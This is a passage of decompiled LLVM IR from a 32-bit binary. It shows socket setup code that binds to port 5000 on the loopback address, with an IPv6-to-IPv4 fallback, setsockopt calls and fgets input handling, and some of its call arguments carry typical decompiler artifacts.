  store i32 %v1_804c6c2, i32* %edx.global-to-local, align 4
  %v1_804c6c9 = add i32 %v0_804c6b3, 624
  %v2_804c6c9 = inttoptr i32 %v1_804c6c9 to i32*
  %v3_804c6c9 = load i32, i32* %v2_804c6c9, align 4
  %v12_804c6c9 = icmp eq i32 %v3_804c6c9, 2
  %v1_804c6d1 = add i32 %v0_804c6b3, 632
  store i32 %v1_804c6d1, i32* %eax.global-to-local, align 4
  %v1_804c6d8 = add i32 %v3_804c6be, 1
  store i32 %v1_804c6d8, i32* @esi, align 4
  %v1_804c6db = icmp eq i1 %v12_804c6c9, false
  br i1 %v1_804c6db, label %dec_label_pc_804c719, label %dec_label_pc_804c6dd

dec_label_pc_804c6dd:                             ; preds = %dec_label_pc_804c6be
  %v0_804c6dd = load i32, i32* @ebx, align 4
  %v2_804c6dd = add i32 %v0_804c6b3, 12
  %v3_804c6dd = inttoptr i32 %v2_804c6dd to i32*
  store i32 %v0_804c6dd, i32* %v3_804c6dd, align 4
  %v1_804c6de = load i32, i32* %ecx.global-to-local, align 4
  %v3_804c6de = mul i32 %v1_804c6de, 28
  store i32 %v3_804c6de, i32* %ebx.global-to-local, align 4
  %v1_804c6e1 = add i32 %v0_804c6b3, 8
  %v2_804c6e1 = inttoptr i32 %v1_804c6e1 to i32*
  store i32 4, i32* %v2_804c6e1, align 4
  %v0_804c6e3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c6e3 = add i32 %v0_804c6b3, 4
  %v3_804c6e3 = inttoptr i32 %v2_804c6e3 to i32*
  store i32 %v0_804c6e3, i32* %v3_804c6e3, align 4
  %v0_804c6e4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c6e4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c6e4 = add i32 %v0_804c6e4, 4
  %v3_804c6e4 = add i32 %v2_804c6e4, %v1_804c6e4
  store i32 %v3_804c6e4, i32* %eax.global-to-local, align 4
  %v3_804c6e8 = inttoptr i32 %v0_804c6b3 to i32*
  store i32 %v3_804c6e4, i32* %v3_804c6e8, align 4
  %v4_804c6e9 = call i32 @memcpy(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c6e9, i32* %eax.global-to-local, align 4
  %v0_804c6ee = load i32, i32* @esp, align 4
  %v1_804c6ee = inttoptr i32 %v0_804c6ee to i32*
  store i32 53, i32* %v1_804c6ee, align 4
  %v2_804c6f5 = call i32 @htons(i16 0)
  store i32 %v2_804c6f5, i32* %eax.global-to-local, align 4
  %v0_804c6fa = load i32, i32* @esp, align 4
  %v1_804c6fa = add i32 %v0_804c6fa, 716
  store i32 %v1_804c6fa, i32* @edx, align 4
  %v0_804c701 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c701 = add i32 %v0_804c701, %v1_804c6fa
  store i32 %v2_804c701, i32* @ebx, align 4
  %v1_804c703 = add i32 %v2_804c701, -240
  %v2_804c703 = inttoptr i32 %v1_804c703 to i16*
  store i16 2, i16* %v2_804c703, align 2
  %v0_804c70c = load i32, i32* %eax.global-to-local, align 4
  %v1_804c70c = trunc i32 %v0_804c70c to i16
  %v2_804c70c = load i32, i32* @ebx, align 4
  %v3_804c70c = add i32 %v2_804c70c, -238
  %v4_804c70c = inttoptr i32 %v3_804c70c to i16*
  store i16 %v1_804c70c, i16* %v4_804c70c, align 2
  %v0_804c713 = load i32, i32* @esi, align 4
  %v1_804c713 = load i32, i32* @esp, align 4
  %v2_804c713 = add i32 %v1_804c713, 52
  %v3_804c713 = inttoptr i32 %v2_804c713 to i32*
  store i32 %v0_804c713, i32* %v3_804c713, align 4
  br label %dec_label_pc_804c771

dec_label_pc_804c719:                             ; preds = %dec_label_pc_804c6be
  %v2_804c719 = add i32 %v0_804c6b3, 12
  %v3_804c719 = inttoptr i32 %v2_804c719 to i32*
  store i32 %v3_804c6be, i32* %v3_804c719, align 4
  store i32 10, i32* @edi, align 4
  %v1_804c71f = add i32 %v0_804c6b3, 8
  %v2_804c71f = inttoptr i32 %v1_804c71f to i32*
  store i32 16, i32* %v2_804c71f, align 4
  %v0_804c721 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c721 = add i32 %v0_804c6b3, 4
  %v3_804c721 = inttoptr i32 %v2_804c721 to i32*
  store i32 %v0_804c721, i32* %v3_804c721, align 4
  %v4_804c722 = load i32, i32* %v2_804c6be, align 4
  %v6_804c722 = mul i32 %v4_804c722, 28
  store i32 %v6_804c722, i32* @ebx, align 4
  %v1_804c727 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c727 = add i32 %v6_804c722, 8
  %v3_804c727 = add i32 %v2_804c727, %v1_804c727
  store i32 %v3_804c727, i32* %eax.global-to-local, align 4
  %v3_804c72b = inttoptr i32 %v0_804c6b3 to i32*
  store i32 %v3_804c727, i32* %v3_804c72b, align 4
  %v4_804c72c = call i32 @memcpy(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c72c, i32* %eax.global-to-local, align 4
  %v0_804c731 = load i32, i32* @esp, align 4
  %v1_804c731 = inttoptr i32 %v0_804c731 to i32*
  store i32 53, i32* %v1_804c731, align 4
  %v2_804c738 = call i32 @htons(i16 0)
  %v3_804c738 = trunc i32 %v2_804c738 to i16
  store i32 %v2_804c738, i32* %eax.global-to-local, align 4
  %v0_804c73d = load i32, i32* @esp, align 4
  %v1_804c73d = add i32 %v0_804c73d, 716
  store i32 %v1_804c73d, i32* %ecx.global-to-local, align 4
  %v0_804c744 = load i32, i32* @ebx, align 4
  %v2_804c744 = add i32 %v0_804c744, %v1_804c73d
  store i32 %v2_804c744, i32* @edx, align 4
  %v4_804c747 = add i32 %v2_804c744, -238
  %v5_804c747 = inttoptr i32 %v4_804c747 to i16*
  store i16 %v3_804c738, i16* %v5_804c747, align 2
  %v0_804c74e = load i32, i32* @esp, align 4
  %v1_804c74e = add i32 %v0_804c74e, 628
  %v2_804c74e = inttoptr i32 %v1_804c74e to i32*
  %v3_804c74e = load i32, i32* %v2_804c74e, align 4
  store i32 %v3_804c74e, i32* %eax.global-to-local, align 4
  %v0_804c755 = load i32, i32* @edx, align 4
  %v1_804c755 = add i32 %v0_804c755, -240
  %v2_804c755 = inttoptr i32 %v1_804c755 to i16*
  store i16 10, i16* %v2_804c755, align 2
  %v0_804c75e = load i32, i32* %eax.global-to-local, align 4
  %v1_804c75e = load i32, i32* @esp, align 4
  %v2_804c75e = load i32, i32* @ebx, align 4
  %v3_804c75e = add i32 %v1_804c75e, 500
  %v4_804c75e = add i32 %v3_804c75e, %v2_804c75e
  %v5_804c75e = inttoptr i32 %v4_804c75e to i32*
  store i32 %v0_804c75e, i32* %v5_804c75e, align 4
  %v0_804c765 = load i32, i32* @esi, align 4
  %v1_804c765 = load i32, i32* @esp, align 4
  %v2_804c765 = add i32 %v1_804c765, 52
  %v3_804c765 = inttoptr i32 %v2_804c765 to i32*
  store i32 %v0_804c765, i32* %v3_804c765, align 4
  %v0_804c769 = load i32, i32* @esp, align 4
  %v1_804c769 = add i32 %v0_804c769, 48
  %v2_804c769 = inttoptr i32 %v1_804c769 to i32*
  store i32 28, i32* %v2_804c769, align 4
  br label %dec_label_pc_804c771

dec_label_pc_804c771:                             ; preds = %dec_label_pc_804c6dd, %dec_label_pc_804c719
  %v0_804c771 = load i32, i32* @esp, align 4
  %v1_804c771 = add i32 %v0_804c771, 16
  br label %dec_label_pc_804c774

dec_label_pc_804c774:                             ; preds = %dec_label_pc_804c65e, %dec_label_pc_804c69f, %dec_label_pc_804c631, %dec_label_pc_804c771
  %v0_804c774 = phi i32 [ %v1_804c646, %dec_label_pc_804c65e ], [ %v1_804c6b3, %dec_label_pc_804c69f ], [ %v1_804c646, %dec_label_pc_804c631 ], [ %v1_804c771, %dec_label_pc_804c771 ]
  %v1_804c774 = add i32 %v0_804c774, 36
  %v2_804c774 = inttoptr i32 %v1_804c774 to i32*
  %v3_804c774 = load i32, i32* %v2_804c774, align 4
  %v4_804c774 = add i32 %v3_804c774, -2
  %v9_804c774 = sub i32 1, %v3_804c774
  %v10_804c774 = and i32 %v9_804c774, %v3_804c774
  %v11_804c774 = icmp slt i32 %v10_804c774, 0
  %v12_804c774 = icmp eq i32 %v4_804c774, 0
  %v13_804c774 = icmp slt i32 %v4_804c774, 0
  %v3_804c779 = icmp eq i1 %v13_804c774, %v11_804c774
  %v4_804c779 = icmp eq i1 %v12_804c774, false
  %v5_804c779 = and i1 %v4_804c779, %v3_804c779
  br i1 %v5_804c779, label %dec_label_pc_804cc2a, label %dec_label_pc_804c774.dec_label_pc_804c77f_crit_edge

dec_label_pc_804c774.dec_label_pc_804c77f_crit_edge: ; preds = %dec_label_pc_804c774
  %v0_804c77f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c77f

dec_label_pc_804c77f:                             ; preds = %entry, %dec_label_pc_804c774.dec_label_pc_804c77f_crit_edge
  %v1_804c77f = phi i32 [ %v0_804c774, %dec_label_pc_804c774.dec_label_pc_804c77f_crit_edge ], [ %v15_804c4ac, %entry ]
  %v0_804c77f = phi i32 [ %v0_804c77f.pre, %dec_label_pc_804c774.dec_label_pc_804c77f_crit_edge ], [ %v6_804c4fb, %entry ]
  %v2_804c77f = add i32 %v1_804c77f, -4
  %v3_804c77f = inttoptr i32 %v2_804c77f to i32*
  store i32 %v0_804c77f, i32* %v3_804c77f, align 4
  %v0_804c780 = load i32, i32* @ebp, align 4
  %v2_804c780 = add i32 %v1_804c77f, -8
  %v3_804c780 = inttoptr i32 %v2_804c780 to i32*
  store i32 %v0_804c780, i32* %v3_804c780, align 4
  %v1_804c781 = add i32 %v1_804c77f, -12
  %v2_804c781 = inttoptr i32 %v1_804c781 to i32*
  store i32 64, i32* %v2_804c781, align 4
  %v1_804c783 = add i32 %v1_804c77f, 544
  store i32 %v1_804c783, i32* %eax.global-to-local, align 4
  %v2_804c78a = add i32 %v1_804c77f, -16
  %v3_804c78a = inttoptr i32 %v2_804c78a to i32*
  store i32 %v1_804c783, i32* %v3_804c78a, align 4
  %v4_804c78b = call i32 @fgets(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c78b, i32* %eax.global-to-local, align 4
  %v0_804c790 = load i32, i32* @esp, align 4
  %v1_804c790 = add i32 %v0_804c790, 16
  %v1_804c793 = icmp eq i32 %v4_804c78b, 0
  %v1_804c795 = icmp eq i1 %v1_804c793, false
  br i1 %v1_804c795, label %dec_label_pc_804c537, label %dec_label_pc_804cc2a

dec_label_pc_804c7bd:                             ; preds = %entry, %dec_label_pc_804cc2a
  %v0_804c7bd = phi i32 [ %v15_804c4ac, %entry ], [ %v1_804cc33, %dec_label_pc_804cc2a ]
  %v1_804c7bd = add i32 %v0_804c7bd, 460
  %v2_804c7bd = inttoptr i32 %v1_804c7bd to i16*
  store i16 2, i16* %v2_804c7bd, align 2
  %v0_804c7c7 = load i32, i32* @esp, align 4
  %v1_804c7ca = add i32 %v0_804c7c7, -16
  %v2_804c7ca = inttoptr i32 %v1_804c7ca to i32*
  store i32 53, i32* %v2_804c7ca, align 4
  %v2_804c7cc = call i32 @htons(i16 5000)
  %v3_804c7cc = trunc i32 %v2_804c7cc to i16
  store i32 %v2_804c7cc, i32* %eax.global-to-local, align 4
  %v0_804c7d1 = load i32, i32* @esp, align 4
  %v1_804c7d1 = inttoptr i32 %v0_804c7d1 to i32*
  store i32 2130706433, i32* %v1_804c7d1, align 4
  %v3_804c7d8 = load i32, i32* @esp, align 4
  %v4_804c7d8 = add i32 %v3_804c7d8, 478
  %v5_804c7d8 = inttoptr i32 %v4_804c7d8 to i16*
  store i16 %v3_804c7cc, i16* %v5_804c7d8, align 2
  %v0_804c7e0 = call i32 @htonl()
  store i32 %v0_804c7e0, i32* %eax.global-to-local, align 4
  %v0_804c7e5 = load i32, i32* @esp, align 4
  %v1_804c7e5 = add i32 %v0_804c7e5, 52
  %v2_804c7e5 = inttoptr i32 %v1_804c7e5 to i32*
  store i32 1, i32* %v2_804c7e5, align 4
  %v1_804c7ed = load i32, i32* @esp, align 4
  %v2_804c7ed = add i32 %v1_804c7ed, 480
  %v3_804c7ed = inttoptr i32 %v2_804c7ed to i32*
  store i32 %v0_804c7e0, i32* %v3_804c7ed, align 4
  %v0_804c7f4 = load i32, i32* @esp, align 4
  %v1_804c7f4 = add i32 %v0_804c7f4, 16
  br label %dec_label_pc_804c7f7

dec_label_pc_804c7f7:                             ; preds = %dec_label_pc_804cc2a, %dec_label_pc_804c7bd
  %v2_804c7f7 = phi i32 [ %v1_804cc33, %dec_label_pc_804cc2a ], [ %v1_804c7f4, %dec_label_pc_804c7bd ]
  %v0_804c7f7 = load i32, i32* @edi, align 4
  %v1_804c7f7 = trunc i32 %v0_804c7f7 to i16
  %v3_804c7f7 = add i32 %v2_804c7f7, 636
  %v4_804c7f7 = inttoptr i32 %v3_804c7f7 to i16*
  store i16 %v1_804c7f7, i16* %v4_804c7f7, align 2
  %v0_804c7ff = load i32, i32* @ebp, align 4
  %v1_804c7ff = load i32, i32* @esp, align 4
  %v2_804c7ff = add i32 %v1_804c7ff, -4
  %v3_804c7ff = inttoptr i32 %v2_804c7ff to i32*
  store i32 %v0_804c7ff, i32* %v3_804c7ff, align 4
  %v1_804c800 = add i32 %v1_804c7ff, -8
  %v2_804c800 = inttoptr i32 %v1_804c800 to i32*
  store i32 0, i32* %v2_804c800, align 4
  %v1_804c802 = add i32 %v1_804c7ff, -12
  %v2_804c802 = inttoptr i32 %v1_804c802 to i32*
  store i32 526338, i32* %v2_804c802, align 4
  %v0_804c807 = load i32, i32* @edi, align 4
  %v2_804c807 = add i32 %v1_804c7ff, -16
  %v3_804c807 = inttoptr i32 %v2_804c807 to i32*
  store i32 %v0_804c807, i32* %v3_804c807, align 4
  %v3_804c808 = call i32 @socket(i32 5000, i32 2, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c808, i32* %eax.global-to-local, align 4
  %v1_804c80d = load i32, i32* @esp, align 4
  %v2_804c80d = add i32 %v1_804c80d, 32
  %v3_804c80d = inttoptr i32 %v2_804c80d to i32*
  store i32 %v3_804c808, i32* %v3_804c80d, align 4
  %v0_804c811 = load i32, i32* @esp, align 4
  %v1_804c811 = add i32 %v0_804c811, 16
  %v0_804c814 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c814 = icmp slt i32 %v0_804c814, 0
  %v1_804c816 = icmp eq i1 %v2_804c814, false
  br i1 %v1_804c816, label %dec_label_pc_804c84c, label %dec_label_pc_804c818

dec_label_pc_804c818:                             ; preds = %dec_label_pc_804c7f7
  %v0_804c818 = load i32, i32* @edi, align 4
  %v9_804c818 = icmp eq i32 %v0_804c818, 10
  %v1_804c81b = icmp eq i1 %v9_804c818, false
  br i1 %v1_804c81b, label %dec_label_pc_804c841, label %dec_label_pc_804c81d

dec_label_pc_804c81d:                             ; preds = %dec_label_pc_804c818
  %v1_804c81d = call i32 @__errno_location(i32 5000)
  store i32 %v1_804c81d, i32* %eax.global-to-local, align 4
  %v1_804c822 = inttoptr i32 %v1_804c81d to i32*
  %v2_804c822 = load i32, i32* %v1_804c822, align 4
  %v11_804c822 = icmp eq i32 %v2_804c822, 97
  %v1_804c825 = icmp eq i1 %v11_804c822, false
  br i1 %v1_804c825, label %dec_label_pc_804c81d.dec_label_pc_804c841_crit_edge, label %dec_label_pc_804c827

dec_label_pc_804c81d.dec_label_pc_804c841_crit_edge: ; preds = %dec_label_pc_804c81d
  %v0_804c841.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c841

dec_label_pc_804c827:                             ; preds = %dec_label_pc_804c81d
  %v0_804c827 = load i32, i32* @esi, align 4
  %v1_804c827 = load i32, i32* @esp, align 4
  %v2_804c827 = add i32 %v1_804c827, -4
  %v3_804c827 = inttoptr i32 %v2_804c827 to i32*
  store i32 %v0_804c827, i32* %v3_804c827, align 4
  %v0_804c828 = load i32, i32* @edi, align 4
  %v1_804c828 = and i32 %v0_804c828, -65536
  %v2_804c828 = or i32 %v1_804c828, 2
  store i32 %v2_804c828, i32* @edi, align 4
  %v1_804c82c = add i32 %v1_804c827, -8
  %v2_804c82c = inttoptr i32 %v1_804c82c to i32*
  store i32 0, i32* %v2_804c82c, align 4
  %v1_804c82e = add i32 %v1_804c827, -12
  %v2_804c82e = inttoptr i32 %v1_804c82e to i32*
  store i32 526338, i32* %v2_804c82e, align 4
  %v1_804c833 = add i32 %v1_804c827, -16
  %v2_804c833 = inttoptr i32 %v1_804c833 to i32*
  store i32 2, i32* %v2_804c833, align 4
  %v3_804c835 = call i32 @socket(i32 5000, i32 2, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c835, i32* %eax.global-to-local, align 4
  %v1_804c83a = load i32, i32* @esp, align 4
  %v2_804c83a = add i32 %v1_804c83a, 32
  %v3_804c83a = inttoptr i32 %v2_804c83a to i32*
  store i32 %v3_804c835, i32* %v3_804c83a, align 4
  %v0_804c83e = load i32, i32* @esp, align 4
  %v1_804c83e = add i32 %v0_804c83e, 16
  br label %dec_label_pc_804c841

dec_label_pc_804c841:                             ; preds = %dec_label_pc_804c81d.dec_label_pc_804c841_crit_edge, %dec_label_pc_804c818, %dec_label_pc_804c827
  %v0_804c841 = phi i32 [ %v0_804c841.pre, %dec_label_pc_804c81d.dec_label_pc_804c841_crit_edge ], [ %v1_804c811, %dec_label_pc_804c818 ], [ %v1_804c83e, %dec_label_pc_804c827 ]
  %v1_804c841 = add i32 %v0_804c841, 16
  %v2_804c841 = inttoptr i32 %v1_804c841 to i32*
  %v3_804c841 = load i32, i32* %v2_804c841, align 4
  %v5_804c841 = icmp slt i32 %v3_804c841, 0
  br i1 %v5_804c841, label %dec_label_pc_804cc25, label %dec_label_pc_804c84c

dec_label_pc_804c84c:                             ; preds = %dec_label_pc_804c841, %dec_label_pc_804c7f7
  %v0_804c84c = phi i32 [ %v0_804c841, %dec_label_pc_804c841 ], [ %v1_804c811, %dec_label_pc_804c7f7 ]
  %v1_804c84c = add i32 %v0_804c84c, 636
  store i32 %v1_804c84c, i32* %eax.global-to-local, align 4
  %v0_804c853 = load i32, i32* @ebx, align 4
  %v2_804c853 = add i32 %v0_804c84c, -4
  %v3_804c853 = inttoptr i32 %v2_804c853 to i32*
  store i32 %v0_804c853, i32* %v3_804c853, align 4
  %v1_804c854 = add i32 %v0_804c84c, 32
  %v2_804c854 = inttoptr i32 %v1_804c854 to i32*
  %v3_804c854 = load i32, i32* %v2_804c854, align 4
  %v5_804c854 = add i32 %v0_804c84c, -8
  %v6_804c854 = inttoptr i32 %v5_804c854 to i32*
  store i32 %v3_804c854, i32* %v6_804c854, align 4
  %v0_804c858 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c858 = add i32 %v0_804c84c, -12
  %v3_804c858 = inttoptr i32 %v2_804c858 to i32*
  store i32 %v0_804c858, i32* %v3_804c858, align 4
  %v1_804c859 = add i32 %v0_804c84c, 16
  %v2_804c859 = inttoptr i32 %v1_804c859 to i32*
  %v3_804c859 = load i32, i32* %v2_804c859, align 4
  %v5_804c859 = add i32 %v0_804c84c, -16
  %v6_804c859 = inttoptr i32 %v5_804c859 to i32*
  store i32 %v3_804c859, i32* %v6_804c859, align 4
  %v3_804c85d = call i32 @bind(i32 5000, i32 2, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c85d, i32* %eax.global-to-local, align 4
  %v0_804c862 = load i32, i32* @esp, align 4
  %v1_804c862 = add i32 %v0_804c862, 16
  %v2_804c865 = icmp slt i32 %v3_804c85d, 0
  br i1 %v2_804c865, label %dec_label_pc_804cc25, label %dec_label_pc_804c86d

dec_label_pc_804c86d:                             ; preds = %dec_label_pc_804c84c
  %v0_804c86d = load i32, i32* @ecx, align 4
  %v2_804c86d = add i32 %v0_804c862, 12
  %v3_804c86d = inttoptr i32 %v2_804c86d to i32*
  store i32 %v0_804c86d, i32* %v3_804c86d, align 4
  %v1_804c86e = add i32 %v0_804c862, 32
  %v2_804c86e = inttoptr i32 %v1_804c86e to i32*
  %v3_804c86e = load i32, i32* %v2_804c86e, align 4
  %v5_804c86e = add i32 %v0_804c862, 8
  %v6_804c86e = inttoptr i32 %v5_804c86e to i32*
  store i32 %v3_804c86e, i32* %v6_804c86e, align 4
  %v1_804c872 = add i32 %v0_804c862, 4
  %v2_804c872 = inttoptr i32 %v1_804c872 to i32*
  store i32 134530156, i32* %v2_804c872, align 4
  %v1_804c877 = add i32 %v0_804c862, 680
  store i32 %v1_804c877, i32* %eax.global-to-local, align 4
  %v3_804c87e = inttoptr i32 %v0_804c862 to i32*
  store i32 %v1_804c877, i32* %v3_804c87e, align 4
  %v0_804c87f = call i32 @_pthread_cleanup_push()
  store i32 %v0_804c87f, i32* %eax.global-to-local, align 4
  %v0_804c884 = load i32, i32* @esp, align 4
  %v1_804c884 = inttoptr i32 %v0_804c884 to i32*
  %v2_804c884 = load i32, i32* %v1_804c884, align 4
  store i32 %v2_804c884, i32* %eax.global-to-local, align 4
  %v3_804c884 = add i32 %v0_804c884, 4
  %v1_804c885 = inttoptr i32 %v3_804c884 to i32*
  %v2_804c885 = load i32, i32* %v1_804c885, align 4
  store i32 %v2_804c885, i32* @edx, align 4
  store i32 0, i32* %v1_804c885, align 4
  %v1_804c888 = add i32 %v0_804c884, 712
  %v2_804c888 = inttoptr i32 %v1_804c888 to i32*
  %v3_804c888 = load i32, i32* %v2_804c888, align 4
  store i32 %v3_804c888, i32* %v1_804c884, align 4
  %v3_804c88f = call i32 @__pthread_setcancelstate(i32 5000, i32* inttoptr (i32 2 to i32*))
  store i32 %v3_804c88f, i32* %eax.global-to-local, align 4
  %v0_804c894 = load i32, i32* @esp, align 4
  %v1_804c894 = add i32 %v0_804c894, 16
  %v0_804c897 = load i32, i32* @edi, align 4
  %v9_804c897 = icmp eq i32 %v0_804c897, 10
  %v1_804c89a = icmp eq i1 %v9_804c897, false
  br i1 %v1_804c89a, label %dec_label_pc_804c92d, label %dec_label_pc_804c8a0

dec_label_pc_804c8a0:                             ; preds = %dec_label_pc_804c86d
  %v1_804c8a0 = add i32 %v0_804c894, 704
  %v2_804c8a0 = inttoptr i32 %v1_804c8a0 to i32*
  store i32 0, i32* %v2_804c8a0, align 4
  %v0_804c8ab = load i32, i32* @esp, align 4
  %v11_804c8ae = load i32, i32* @edi, align 4
  %v12_804c8ae = and i32 %v11_804c8ae, -65536
  store i32 %v12_804c8ae, i32* @edi, align 4
  %v1_804c8b1 = add i32 %v0_804c8ab, -16
  %v2_804c8b1 = inttoptr i32 %v1_804c8b1 to i32*
  store i32 4, i32* %v2_804c8b1, align 4
  %v1_804c8b3 = add i32 %v0_804c8ab, 688
  store i32 %v1_804c8b3, i32* %eax.global-to-local, align 4
  %v2_804c8ba = add i32 %v0_804c8ab, -20
  %v3_804c8ba = inttoptr i32 %v2_804c8ba to i32*
  store i32 %v1_804c8b3, i32* %v3_804c8ba, align 4
  %v1_804c8bb = add i32 %v0_804c8ab, -24
  %v2_804c8bb = inttoptr i32 %v1_804c8bb to i32*
  store i32 26, i32* %v2_804c8bb, align 4
  %v1_804c8bd = add i32 %v0_804c8ab, -28
  %v2_804c8bd = inttoptr i32 %v1_804c8bd to i32*
  store i32 41, i32* %v2_804c8bd, align 4
  %v1_804c8bf = add i32 %v0_804c8ab, 16
  %v2_804c8bf = inttoptr i32 %v1_804c8bf to i32*
  %v3_804c8bf = load i32, i32* %v2_804c8bf, align 4
  %v5_804c8bf = add i32 %v0_804c8ab, -32
  %v6_804c8bf = inttoptr i32 %v5_804c8bf to i32*
  store i32 %v3_804c8bf, i32* %v6_804c8bf, align 4
  %v0_804c8c3 = call i32 @setsockopt()
  store i32 %v0_804c8c3, i32* %eax.global-to-local, align 4
  %v0_804c8c8 = load i32, i32* @esp, align 4
  %v1_804c8c8 = add i32 %v0_804c8c8, 516
  store i32 %v1_804c8c8, i32* @esi, align 4
  %v1_804c8cf = add i32 %v0_804c8c8, 32
  %v1_804c8d2 = add i32 %v0_804c8c8, 492
  store i32 %v1_804c8d2, i32* @ebp, align 4
  %v0_804c927.pre = load i32, i32* @edi, align 4
  %v2_804c927160 = add i32 %v0_804c8c8, 68
  %v3_804c927161 = inttoptr i32 %v2_804c927160 to i32*
  %v4_804c927162 = load i32, i32* %v3_804c927161, align 4
  %v5_804c927163 = sub i32 %v0_804c927.pre, %v4_804c927162
  %v11_804c927165 = xor i32 %v4_804c927162, %v0_804c927.pre
  %v12_804c927166 = xor i32 %v5_804c927163, %v0_804c927.pre
  %v13_804c927167 = and i32 %v12_804c927166, %v11_804c927165
  %v14_804c927168 = icmp slt i32 %v13_804c927167, 0
  %v16_804c927170 = icmp slt i32 %v5_804c927163, 0
  %v2_804c92b171 = icmp eq i1 %v16_804c927170, %v14_804c927168
  br i1 %v2_804c92b171, label %dec_label_pc_804c92d, label %dec_label_pc_804c8db

dec_label_pc_804c8db:                             ; preds = %dec_label_pc_804c8a0, %dec_label_pc_804c923
  %v0_804c927174 = phi i32 [ %v1_804c923, %dec_label_pc_804c923 ], [ %v0_804c927.pre, %dec_label_pc_804c8a0 ]
  %v1_804c8e2173 = phi i32 [ %v1_804c927.pre, %dec_label_pc_804c923 ], [ %v1_804c8cf, %dec_label_pc_804c8a0 ]
  %v0_804c8db172 = phi i32 [ %v1_804c924, %dec_label_pc_804c923 ], [ %v1_804c8c8, %dec_label_pc_804c8a0 ]
  %v1_804c8db = add i32 %v0_804c8db172, -24
  %v2_804c8db = inttoptr i32 %v1_804c8db to i16*
  %v3_804c8db = load i16, i16* %v2_804c8db, align 2
  %v12_804c8db = icmp eq i16 %v3_804c8db, 2
  %v1_804c8e0 = icmp eq i1 %v12_804c8db, false
  br i1 %v1_804c8e0, label %dec_label_pc_804c923, label %dec_label_pc_804c8e2

dec_label_pc_804c8e2:                             ; preds = %dec_label_pc_804c8db
  %v0_804c8e2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c8e2 = add i32 %v1_804c8e2173, -4
  %v3_804c8e2 = inttoptr i32 %v2_804c8e2 to i32*
  store i32 %v0_804c8e2, i32* %v3_804c8e2, align 4
  %v1_804c8e3 = load i32, i32* @edi, align 4
  %v3_804c8e3 = mul i32 %v1_804c8e3, 28
  store i32 %v3_804c8e3, i32* %eax.global-to-local, align 4
  %v1_804c8e6 = add i32 %v1_804c8e2173, -8
  %v2_804c8e6 = inttoptr i32 %v1_804c8e6 to i32*
  store i32 4, i32* %v2_804c8e6, align 4
  %v0_804c8e8 = load i32, i32* @ebp, align 4
  %v1_804c8e8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c8e8 = add i32 %v1_804c8e8, %v0_804c8e8
  %v1_804c8ec = add i32 %v2_804c8e8, 4
  store i32 %v1_804c8ec, i32* %edx.global-to-local, align 4
  %v1_804c8ef = add i32 %v2_804c8e8, 8
  store i32 %v1_804c8ef, i32* @ebx, align 4
  %v2_804c8f2 = add i32 %v1_804c8e2173, -12
  %v3_804c8f2 = inttoptr i32 %v2_804c8f2 to i32*
  store i32 %v1_804c8ec, i32* %v3_804c8f2, align 4
  %v0_804c8f3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c8f3 = load i32, i32* @ebp, align 4
  %v2_804c8f3 = add i32 %v0_804c8f3, 20
  %v3_804c8f3 = add i32 %v2_804c8f3, %v1_804c8f3
  store i32 %v3_804c8f3, i32* %eax.global-to-local, align 4
  %v2_804c8f7 = add i32 %v1_804c8e2173, -16
  %v3_804c8f7 = inttoptr i32 %v2_804c8f7 to i32*
  store i32 %v3_804c8f3, i32* %v3_804c8f7, align 4
  %v4_804c8f8 = call i32 @memcpy(i8* inttoptr (i32 5000 to i8*), i32 2, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c8f8, i32* %eax.global-to-local, align 4
  %v0_804c8fd = load i32, i32* @esp, align 4
  %v1_804c900 = add i32 %v0_804c8fd, 8
  %v2_804c900 = inttoptr i32 %v1_804c900 to i32*
  store i32 12, i32* %v2_804c900, align 4
  %v1_804c902 = add i32 %v0_804c8fd, 4
  %v2_804c902 = inttoptr i32 %v1_804c902 to i32*
  store i32 ptrtoint (i32* @global_var_805458f.357 to i32), i32* %v2_804c902, align 4
  %v0_804c907 = load i32, i32* @ebx, align 4
  %v3_804c907 = inttoptr i32 %v0_804c8fd to i32*
  store i32 %v0_804c907, i32* %v3_804c907, align 4
  %v4_804c908 = call i32 @memcpy(i8* inttoptr (i32 5000 to i8*), i32 2, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c908, i32* %eax.global-to-local, align 4
  %v0_804c910 = load i32, i32* @esi, align 4
  %v1_804c910 = add i32 %v0_804c910, -24
  %v2_804c910 = inttoptr i32 %v1_804c910 to i16*
  store i16 10, i16* %v2_804c910, align 2
  %v0_804c916 = load i32, i32* @esi, align 4
  %v1_804c916 = add i32 %v0_804c916, -20
  %v2_804c916 = inttoptr i32 %v1_804c916 to i32*
  store i32 0, i32* %v2_804c916, align 4
  %v0_804c91d = load i32, i32* @esi, align 4
  %v1_804c91d = inttoptr i32 %v0_804c91d to i32*
  store i32 0, i32* %v1_804c91d, align 4
  %v0_804c923.pre = load i32, i32* @edi, align 4
  %v0_804c924.pre = load i32, i32* @esi, align 4
  %v1_804c927.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c923

dec_label_pc_804c923:                             ; preds = %dec_label_pc_804c8db, %dec_label_pc_804c8e2
  %v1_804c927.pre = phi i32 [ %v1_804c8e2173, %dec_label_pc_804c8db ], [ %v1_804c927.pre.pre, %dec_label_pc_804c8e2 ]
